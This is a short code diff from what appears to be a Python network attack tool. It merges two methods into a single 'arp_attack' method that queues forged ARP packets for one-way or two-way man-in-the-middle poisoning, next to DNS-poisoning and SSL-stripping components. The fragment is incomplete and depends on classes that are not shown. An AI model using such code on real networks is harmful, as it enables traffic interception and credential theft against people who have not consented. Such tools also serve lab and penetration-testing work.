@@ -15,14 +15,14 @@ class Host():
         self.dns_poisoner = DnsPoisoner(ip, dns_queue_num)
         self.ssl_remover  = SslRemover(ip, dns_queue_num + 1)
 
-    def arp_oneway(self, other_ip, other_mac):
+    def arp_attack(self, oneway, other_ip, other_mac):
 
-        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
+        if oneway:
+            self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
 
-    def arp_mitm(self, other_ip, other_mac):
-
-        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
-        self.arp_poisoner.add_packet(self.mac, other_mac, self.ip, other_ip)
+        else:
+            self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
+            self.arp_poisoner.add_packet(self.mac, other_mac, self.ip, other_ip)
 
     def arp_start(self):
 
